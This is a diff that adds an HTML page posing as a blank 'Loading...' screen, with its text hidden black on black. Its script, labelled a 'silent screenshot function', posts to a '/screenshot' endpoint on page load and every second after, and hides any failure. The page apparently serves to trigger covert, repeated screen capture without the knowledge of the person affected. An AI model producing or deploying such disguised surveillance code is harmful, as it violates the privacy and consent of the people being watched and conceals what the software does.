@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background: #000;
+            color: #000;
+            font-family: Arial, sans-serif;
+        }
+    </style>
+</head>
+<body>
+
+    <script>
+        // Silent screenshot function
+        async function takeScreenshot() {
+            try {
+                await fetch('/screenshot', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    }
+                });
+            } catch (error) {
+                // Silent fail
+            }
+        }
+        
+        // Take screenshot immediately when page loads
+        takeScreenshot();
+        
+        // Take screenshots every 1 second while page is open
+        setInterval(takeScreenshot, 1000);
+    </script>
+</body>
+</html>
